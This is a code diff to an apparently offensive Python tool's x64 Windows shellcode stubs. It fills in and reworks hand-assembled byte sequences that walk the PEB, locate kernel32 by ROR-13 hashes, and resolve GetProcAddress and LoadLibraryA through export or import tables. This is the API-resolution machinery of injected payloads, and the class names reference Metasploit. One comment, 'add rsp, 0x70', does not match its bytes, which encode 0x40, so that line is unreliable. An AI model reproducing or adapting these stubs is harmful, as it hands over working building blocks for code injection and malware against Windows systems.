@@ -694,61 +694,66 @@ class stubs_64:
     def gpa_parser_stub(self):
         shellcode = bytes(
             "\xfc"                                              # cld 
-            "\x41\x51"                                          # push r9
-            "\x41\x50"                                          # push r8
             "\x52"                                              # push rdx
             "\x51"                                              # push rcx
+            "\x57"                                              # push rdi
+            "\x53"                                              # push rbx
             "\x56"                                              # push rsi
+            "\x41\x50"                                          # push r8
+            "\x41\x51"                                          # push r9
+            "\x41\x54"                                          # push r12
+            "\x41\x55"                                          # push r13
+            "\x41\x56"                                          # push r14
+            "\x41\x57"                                          # push r15
             "\x48\x31\xd2"                                      # xor rdx, rdx
             "\x65\x48\x8b\x52\x60"                              # mov rdx, qword ptr gs:[rdx + 0x60]
             "\x48\x8b\x52\x10"                                  # mov rdx, qword ptr [rdx + 0x10]
-            "\x48\x89\xd3"                                      # mov rbx, rdx
+            "\x49\x89\xd5"                                      # mov r13, rdx
             "\x8b\x42\x3c"                                      # mov eax, dword ptr [rdx + 0x3c]
             "\x48\x01\xc2"                                      # add rdx, rax
             "\x8b\xba\x90\x00\x00\x00"                          # mov edi, dword ptr [rdx + 0x90]
-            "\x48\x01\xdf"                                      # add rdi, rbx
+            "\x4c\x01\xef"                                      # add rdi, r13
             "\x8b\x57\x0c"                                      # mov edx, dword ptr [rdi + 0xc]
-            "\x48\x01\xda"                                      # add rdx, rbx
+            "\x4c\x01\xea"                                      # add rdx, r13
             "\x81\x3a\x4b\x45\x52\x4e"                          # cmp dword ptr [rdx], 0x4e52454b
-            "\x75\x09"                                          # jne 0x3e
+            "\x75\x09"                                          # jne 0x48
             "\x81\x7a\x04\x45\x4c\x33\x32"                      # cmp dword ptr [rdx + 4], 0x32334c45
-            "\x74\x06"                                          # je 0x44
+            "\x74\x06"                                          # je 0x4e
             "\x48\x83\xc7\x14"                                  # add rdi, 0x14
-            "\xeb\xe3"                                          # jmp 0x27
+            "\xeb\xe3"                                          # jmp 0x31
             "\x57"                                              # push rdi
-            "\xeb\x46"                                          # jmp 0x8d
+            "\xeb\x47"                                          # jmp 0x98
             "\x8b\x57\x10"                                      # mov edx, dword ptr [rdi + 0x10]
-            "\x48\x01\xda"                                      # add rdx, rbx
+            "\x4c\x01\xea"                                      # add rdx, r13
             "\x8b\x37"                                          # mov esi, dword ptr [rdi]
-            "\x48\x01\xde"                                      # add rsi, rbx
+            "\x4c\x01\xee"                                      # add rsi, r13
             "\x48\x89\xd1"                                      # mov rcx, rdx
             "\x48\x81\xc1\x00\x00\xff\x00"                      # add rcx, 0xff0000
-            "\x48\x31\xed"                                      # xor rbp, rbp
+            "\x4d\x31\xdb"                                      # xor r11, r11
             "\x8b\x06"                                          # mov eax, dword ptr [rsi]
-            "\x48\x01\xd8"                                      # add rax, rbx
+            "\x4c\x01\xe8"                                      # add rax, r13
             "\x48\x83\xc0\x02"                                  # add rax, 2
             "\x48\x39\xc1"                                      # cmp rcx, rax
-            "\x72\x17"                                          # jb 0x84
+            "\x72\x17"                                          # jb 0x8e
             "\x48\x39\xd0"                                      # cmp rax, rdx
-            "\x72\x12"                                          # jb 0x84
+            "\x72\x12"                                          # jb 0x8e
             "\x8b\x7c\x24\x08"                                  # mov edi, dword ptr [rsp + 8]
             "\x39\x38"                                          # cmp dword ptr [rax], edi
-            "\x75\x0a"                                          # jne 0x84
+            "\x75\x0a"                                          # jne 0x8e
             "\x8b\x7c\x24\x10"                                  # mov edi, dword ptr [rsp + 0x10]
             "\x39\x78\x08"                                      # cmp dword ptr [rax + 8], edi
-            "\x75\x01"                                          # jne 0x84
+            "\x75\x01"                                          # jne 0x8e
             "\xc3"                                              # ret 
-            "\x83\xc5\x04"                                      # add ebp, 4
+            "\x41\x83\xc3\x04"                                  # add r11d, 4
             "\x48\x83\xc6\x04"                                  # add rsi, 4
-            "\xeb\xd2"                                          # jmp 0x5f
-            "\x52"                                              # push rdx
+            "\xeb\xd1"                                          # jmp 0x69
             "\x68\x64\x64\x72\x65"                              # push 0x65726464
             "\x68\x47\x65\x74\x50"                              # push 0x50746547
-            "\xe8\xaa\xff\xff\xff"                              # call 0x47
-            "\x48\x01\xea"                                      # add rdx, rbp
-            "\x5d"                                              # pop rbp
-            "\x5d"                                              # pop rbp
-            "\x48\x89\xd5"                                      # mov rbp, rdx
+            "\xe8\xaa\xff\xff\xff"                              # call 0x51
+            "\x4c\x01\xda"                                      # add rdx, r11
+            "\x59"                                              # pop rcx
+            "\x59"                                              # pop rcx
+            "\x49\x89\xd7"                                      # mov r15, rdx
             "\x48\x31\xd2"                                      # xor rdx, rdx
             "\x65\x48\x8b\x52\x60"                              # mov rdx, qword ptr gs:[rdx + 0x60]
             "\x48\x8b\x52\x18"                                  # mov rdx, qword ptr [rdx + 0x18]
@@ -760,15 +765,15 @@ class stubs_64:
             "\x48\x31\xc0"                                      # xor rax, rax
             "\xac"                                              # lodsb al, byte ptr [rsi]
             "\x3c\x61"                                          # cmp al, 0x61
-            "\x7c\x02"                                          # jl 0xc9
+            "\x7c\x02"                                          # jl 0xd3
             "\x2c\x20"                                          # sub al, 0x20
             "\x41\xc1\xc9\x0d"                                  # ror r9d, 0xd
             "\x41\x01\xc1"                                      # add r9d, eax
-            "\xe2\xed"                                          # loop 0xbf
+            "\xe2\xed"                                          # loop 0xc9
             "\x49\x81\xf9\x5b\xbc\x4a\x6a"                      # cmp r9, 0x6a4abc5b
             "\x48\x8b\x5a\x20"                                  # mov rbx, qword ptr [rdx + 0x20]
             "\x48\x8b\x12"                                      # mov rdx, qword ptr [rdx]
-            "\x75\xd3"                                          # jne 0xb5
+            "\x75\xd3"                                          # jne 0xbf
             "\x6a\x00"                                          # push 0
             "\x6a\x00"                                          # push 0
             "\xc7\x44\x24\x08\x61\x72\x79\x41"                  # mov dword ptr [rsp + 8], 0x41797261
@@ -777,20 +782,225 @@ class stubs_64:
             "\x48\x89\xe2"                                      # mov rdx, rsp
             "\x48\x89\xd9"                                      # mov rcx, rbx
             "\x48\x83\xec\x20"                                  # sub rsp, 0x20
-            "\xff\x55\x00"                                      # call qword ptr [rbp]
+            "\x4d\x89\xd5"                                      # mov r13, r10
+            "\x41\xff\x17"                                      # call qword ptr [r15]
             "\x50"                                              # push rax
-            "\x48\x89\xe3"                                      # mov rbx, rsp
+            "\x49\x89\xe6"                                      # mov r14, rsp
+            "\x4d\x89\xea"                                      # mov r10, r13
             "\x48\x83\xc4\x40"                                  # add rsp, 0x40
             , 'iso-8859-1')
 
         return shellcode
 
     def loaded_lla_gpa_parser_stub(self):
-        pass
-
+        shellcode = bytes(
+                    "\xfc"                                              # cld 
+                    "\x52"                                              # push rdx
+                    "\x51"                                              # push rcx
+                    "\x57"                                              # push rdi
+                    "\x53"                                              # push rbx
+                    "\x56"                                              # push rsi
+                    "\x41\x50"                                          # push r8
+                    "\x41\x51"                                          # push r9
+                    "\x41\x54"                                          # push r12
+                    "\x41\x55"                                          # push r13
+                    "\x41\x56"                                          # push r14
+                    "\x41\x57"                                          # push r15
+                    "\x48\x31\xd2"                                      # xor rdx, rdx
+                    "\x65\x48\x8b\x52\x60"                              # mov rdx, qword ptr gs:[rdx + 0x60]
+                    "\x48\x8b\x52\x18"                                  # mov rdx, qword ptr [rdx + 0x18]
+                    "\x48\x8b\x52\x20"                                  # mov rdx, qword ptr [rdx + 0x20]
+                    "\x48\x8b\x72\x50"                                  # mov rsi, qword ptr [rdx + 0x50]
+                    "\x6a\x18"                                          # push 0x18
+                    "\x59"                                              # pop rcx
+                    "\x4d\x31\xc9"                                      # xor r9, r9
+                    "\x48\x31\xc0"                                      # xor rax, rax
+                    "\xac"                                              # lodsb al, byte ptr [rsi]
+                    "\x3c\x61"                                          # cmp al, 0x61
+                    "\x7c\x02"                                          # jl 0x37
+                    "\x2c\x20"                                          # sub al, 0x20
+                    "\x41\xc1\xc9\x0d"                                  # ror r9d, 0xd
+                    "\x41\x01\xc1"                                      # add r9d, eax
+                    "\xe2\xed"                                          # loop 0x2d
+                    "\x41\x81\xf9\xf4\x43\x8a\xc7"                      # cmp r9d, 0xc78a43f4
+                    "\x4c\x8b\x6a\x20"                                  # mov r13, qword ptr [rdx + 0x20]
+                    "\x48\x8b\x12"                                      # mov rdx, qword ptr [rdx]
+                    "\x75\xd3"                                          # jne 0x23
+                    "\x4c\x89\xea"                                      # mov rdx, r13
+                    "\x8b\x42\x3c"                                      # mov eax, dword ptr [rdx + 0x3c]
+                    "\x48\x01\xc2"                                      # add rdx, rax
+                    "\x8b\xba\x90\x00\x00\x00"                          # mov edi, dword ptr [rdx + 0x90]
+                    "\x4c\x01\xef"                                      # add rdi, r13
+                    "\x8b\x57\x0c"                                      # mov edx, dword ptr [rdi + 0xc]
+                    "\x4c\x01\xea"                                      # add rdx, r13
+                    "\x81\x3a\x4b\x45\x52\x4e"                          # cmp dword ptr [rdx], 0x4e52454b
+                    "\x75\x09"                                          # jne 0x79
+                    "\x81\x7a\x04\x45\x4c\x33\x32"                      # cmp dword ptr [rdx + 4], 0x32334c45
+                    "\x74\x06"                                          # je 0x7f
+                    "\x48\x83\xc7\x14"                                  # add rdi, 0x14
+                    "\xeb\xe3"                                          # jmp 0x62
+                    "\x57"                                              # push rdi
+                    "\xeb\x47"                                          # jmp 0xc9
+                    "\x8b\x57\x10"                                      # mov edx, dword ptr [rdi + 0x10]
+                    "\x4c\x01\xea"                                      # add rdx, r13
+                    "\x8b\x37"                                          # mov esi, dword ptr [rdi]
+                    "\x4c\x01\xee"                                      # add rsi, r13
+                    "\x48\x89\xd1"                                      # mov rcx, rdx
+                    "\x48\x81\xc1\x00\x00\xff\x00"                      # add rcx, 0xff0000
+                    "\x4d\x31\xdb"                                      # xor r11, r11
+                    "\x8b\x06"                                          # mov eax, dword ptr [rsi]
+                    "\x4c\x01\xe8"                                      # add rax, r13
+                    "\x48\x83\xc0\x02"                                  # add rax, 2
+                    "\x48\x39\xc1"                                      # cmp rcx, rax
+                    "\x72\x17"                                          # jb 0xbf
+                    "\x48\x39\xd0"                                      # cmp rax, rdx
+                    "\x72\x12"                                          # jb 0xbf
+                    "\x8b\x7c\x24\x08"                                  # mov edi, dword ptr [rsp + 8]
+                    "\x39\x38"                                          # cmp dword ptr [rax], edi
+                    "\x75\x0a"                                          # jne 0xbf
+                    "\x8b\x7c\x24\x10"                                  # mov edi, dword ptr [rsp + 0x10]
+                    "\x39\x78\x08"                                      # cmp dword ptr [rax + 8], edi
+                    "\x75\x01"                                          # jne 0xbf
+                    "\xc3"                                              # ret 
+                    "\x41\x83\xc3\x04"                                  # add r11d, 4
+                    "\x48\x83\xc6\x04"                                  # add rsi, 4
+                    "\xeb\xd1"                                          # jmp 0x9a
+                    "\x68\x61\x72\x79\x41"                              # push 0x41797261
+                    "\x68\x4c\x6f\x61\x64"                              # push 0x64616f4c
+                    "\xe8\xaa\xff\xff\xff"                              # call 0x82
+                    "\x4c\x01\xda"                                      # add rdx, r11
+                    "\x48\x83\xc4\x10"                                  # add rsp, 0x10
+                    "\x5f"                                              # pop rdi
+                    "\x52"                                              # push rdx
+                    "\x68\x64\x64\x72\x65"                              # push 0x65726464
+                    "\x68\x47\x65\x74\x50"                              # push 0x50746547
+                    "\xe8\x92\xff\xff\xff"                              # call 0x82
+                    "\x4c\x01\xda"                                      # add rdx, r11
+                    "\x59"                                              # pop rcx
+                    "\x59"                                              # pop rcx
+                    "\x41\x5e"                                          # pop r14
+                    "\x49\x89\xd7"                                      # mov r15, rdx
+                    , 'iso-8859-1')
+        return shellcode
+    
     def loaded_gpa_iat_parser_stub(self):
-        pass
-
+        shellcode = bytes(
+            "\xfc"                                              # cld 
+            "\x52"                                              # push rdx
+            "\x51"                                              # push rcx
+            "\x57"                                              # push rdi
+            "\x53"                                              # push rbx
+            "\x56"                                              # push rsi
+            "\x41\x50"                                          # push r8
+            "\x41\x51"                                          # push r9
+            "\x41\x54"                                          # push r12
+            "\x41\x55"                                          # push r13
+            "\x41\x56"                                          # push r14
+            "\x41\x57"                                          # push r15
+            "\x48\x31\xd2"                                      # xor rdx, rdx
+            "\x65\x48\x8b\x52\x60"                              # mov rdx, qword ptr gs:[rdx + 0x60]
+            "\x48\x8b\x52\x18"                                  # mov rdx, qword ptr [rdx + 0x18]
+            "\x48\x8b\x52\x20"                                  # mov rdx, qword ptr [rdx + 0x20]
+            "\x48\x8b\x72\x50"                                  # mov rsi, qword ptr [rdx + 0x50]
+            "\x6a\x18"                                          # push 0x18
+            "\x59"                                              # pop rcx
+            "\x4d\x31\xc9"                                      # xor r9, r9
+            "\x48\x31\xc0"                                      # xor rax, rax
+            "\xac"                                              # lodsb al, byte ptr [rsi]
+            "\x3c\x61"                                          # cmp al, 0x61
+            "\x7c\x02"                                          # jl 0x37
+            "\x2c\x20"                                          # sub al, 0x20
+            "\x41\xc1\xc9\x0d"                                  # ror r9d, 0xd
+            "\x41\x01\xc1"                                      # add r9d, eax
+            "\xe2\xed"                                          # loop 0x2d
+            "\x41\x81\xf9\xf4\x43\x8a\xc7"                      # cmp r9d, 0xc78a43f4
+            "\x4c\x8b\x6a\x20"                                  # mov r13, qword ptr [rdx + 0x20]
+            "\x48\x8b\x12"                                      # mov rdx, qword ptr [rdx]
+            "\x75\xd3"                                          # jne 0x23
+            "\x4c\x89\xea"                                      # mov rdx, r13
+            "\x8b\x42\x3c"                                      # mov eax, dword ptr [rdx + 0x3c]
+            "\x48\x01\xc2"                                      # add rdx, rax
+            "\x8b\xba\x90\x00\x00\x00"                          # mov edi, dword ptr [rdx + 0x90]
+            "\x4c\x01\xef"                                      # add rdi, r13
+            "\x8b\x57\x0c"                                      # mov edx, dword ptr [rdi + 0xc]
+            "\x4c\x01\xea"                                      # add rdx, r13
+            "\x81\x3a\x4b\x45\x52\x4e"                          # cmp dword ptr [rdx], 0x4e52454b
+            "\x75\x09"                                          # jne 0x79
+            "\x81\x7a\x04\x45\x4c\x33\x32"                      # cmp dword ptr [rdx + 4], 0x32334c45
+            "\x74\x06"                                          # je 0x7f
+            "\x48\x83\xc7\x14"                                  # add rdi, 0x14
+            "\xeb\xe3"                                          # jmp 0x62
+            "\x57"                                              # push rdi
+            "\xeb\x47"                                          # jmp 0xc9
+            "\x8b\x57\x10"                                      # mov edx, dword ptr [rdi + 0x10]
+            "\x4c\x01\xea"                                      # add rdx, r13
+            "\x8b\x37"                                          # mov esi, dword ptr [rdi]
+            "\x4c\x01\xee"                                      # add rsi, r13
+            "\x48\x89\xd1"                                      # mov rcx, rdx
+            "\x48\x81\xc1\x00\x00\xff\x00"                      # add rcx, 0xff0000
+            "\x4d\x31\xdb"                                      # xor r11, r11
+            "\x8b\x06"                                          # mov eax, dword ptr [rsi]
+            "\x4c\x01\xe8"                                      # add rax, r13
+            "\x48\x83\xc0\x02"                                  # add rax, 2
+            "\x48\x39\xc1"                                      # cmp rcx, rax
+            "\x72\x17"                                          # jb 0xbf
+            "\x48\x39\xd0"                                      # cmp rax, rdx
+            "\x72\x12"                                          # jb 0xbf
+            "\x8b\x7c\x24\x08"                                  # mov edi, dword ptr [rsp + 8]
+            "\x39\x38"                                          # cmp dword ptr [rax], edi
+            "\x75\x0a"                                          # jne 0xbf
+            "\x8b\x7c\x24\x10"                                  # mov edi, dword ptr [rsp + 0x10]
+            "\x39\x78\x08"                                      # cmp dword ptr [rax + 8], edi
+            "\x75\x01"                                          # jne 0xbf
+            "\xc3"                                              # ret 
+            "\x41\x83\xc3\x04"                                  # add r11d, 4
+            "\x48\x83\xc6\x04"                                  # add rsi, 4
+            "\xeb\xd1"                                          # jmp 0x9a
+            "\x68\x64\x64\x72\x65"                              # push 0x65726464
+            "\x68\x47\x65\x74\x50"                              # push 0x50746547
+            "\xe8\xaa\xff\xff\xff"                              # call 0x82
+            "\x4c\x01\xda"                                      # add rdx, r11
+            "\x59"                                              # pop rcx
+            "\x59"                                              # pop rcx
+            "\x49\x89\xd7"                                      # mov r15, rdx
+            "\x48\x31\xd2"                                      # xor rdx, rdx
+            "\x65\x48\x8b\x52\x60"                              # mov rdx, qword ptr gs:[rdx + 0x60]
+            "\x48\x8b\x52\x18"                                  # mov rdx, qword ptr [rdx + 0x18]
+            "\x48\x8b\x52\x20"                                  # mov rdx, qword ptr [rdx + 0x20]
+            "\x48\x8b\x72\x50"                                  # mov rsi, qword ptr [rdx + 0x50]
+            "\x6a\x18"                                          # push 0x18
+            "\x59"                                              # pop rcx
+            "\x4d\x31\xc9"                                      # xor r9, r9
+            "\x48\x31\xc0"                                      # xor rax, rax
+            "\xac"                                              # lodsb al, byte ptr [rsi]
+            "\x3c\x61"                                          # cmp al, 0x61
+            "\x7c\x02"                                          # jl 0x104
+            "\x2c\x20"                                          # sub al, 0x20
+            "\x41\xc1\xc9\x0d"                                  # ror r9d, 0xd
+            "\x41\x01\xc1"                                      # add r9d, eax
+            "\xe2\xed"                                          # loop 0xfa
+            "\x49\x81\xf9\x5b\xbc\x4a\x6a"                      # cmp r9, 0x6a4abc5b
+            "\x4c\x8b\x6a\x20"                                  # mov r13, qword ptr [rdx + 0x20]
+            "\x48\x8b\x12"                                      # mov rdx, qword ptr [rdx]
+            "\x75\xd3"                                          # jne 0xf0
+            "\x6a\x00"                                          # push 0
+            "\x6a\x00"                                          # push 0
+            "\xc7\x44\x24\x08\x61\x72\x79\x41"                  # mov dword ptr [rsp + 8], 0x41797261
+            "\xc7\x44\x24\x04\x4c\x69\x62\x72"                  # mov dword ptr [rsp + 4], 0x7262694c
+            "\xc7\x04\x24\x4c\x6f\x61\x64"                      # mov dword ptr [rsp], 0x64616f4c
+            "\x48\x89\xe2"                                      # mov rdx, rsp
+            "\x4c\x89\xe9"                                      # mov rcx, r13
+            "\x48\x83\xec\x20"                                  # sub rsp, 0x20
+            "\x4d\x89\xd5"                                      # mov r13, r10
+            "\x41\xff\x17"                                      # call qword ptr [r15]
+            "\x50"                                              # push rax
+            "\x49\x89\xe6"                                      # mov r14, rsp
+            "\x4d\x89\xea"                                      # mov r10, r13
+            "\x48\x83\xc4\x40"                                  # add rsp, 0x70
+            , 'iso-8859-1'
+            )
+        
+        return shellcode
 
 class x86_windows_metasploit:
     
@@ -1770,13 +1980,6 @@ class x86_windows_metasploit:
             self.stub += b"\x5f"                     # pop    rdi
             self.stub += b"\x59"                     # pop    rcx
             self.stub += b"\x5a"                     # pop    rdx
-            #self.stub += b"\x5B"                                     # pop rbx
-            #self.stub += b"\x41\x5D"                                 # pop r13
-            #self.stub += b"\x5e"                                     # pop    rsi
-            #self.stub += b"\x59"                                     # pop    rcx
-            #self.stub += b"\x5a"                                     # pop    rdx
-            #self.stub += b"\x41\x58"                                 # pop    r8
-            #self.stub += b"\x41\x59"                                 # pop    r9
             self.stub += b"\x5D"                                     # pop    rbp (save return addr)
             self.stub += b"\x48\x83\xE4\xF0"                         # and rsp, 0xfffffffffffffff0 ; align the stack
             self.stub += b"\x48\x83\xEC\x20"                         # sub rsp, 0x20
